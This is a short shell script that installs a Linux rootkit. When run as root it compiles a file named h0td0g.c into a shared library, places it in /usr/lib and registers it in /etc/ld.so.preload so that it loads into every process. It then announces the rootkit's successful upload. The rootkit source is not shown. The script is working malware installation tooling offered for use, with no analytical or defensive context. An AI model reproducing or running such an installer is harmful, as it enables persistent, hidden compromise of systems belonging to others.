if [ $(whoami) = "root" ]; then

echo -en "\033[32m[+] Install\033[0m"

for load in $(seq 1 3); do
echo  -n "."
sleep 0.5;
done

/usr/bin/gcc h0td0g.c -o libcz.so -shared -fPIC -ldl

mv libcz.so /usr/lib

echo "/usr/lib/libcz.so" >> /etc/ld.so.preload
ldconfig

clear

echo -e "\033[32m[!] UPLOAD OF ROOTKIT: SUCESS, GOOD LUCK!!\033[0m"

else

echo -e "\033[31m[!] Run With ROOT!\033[0m"

fi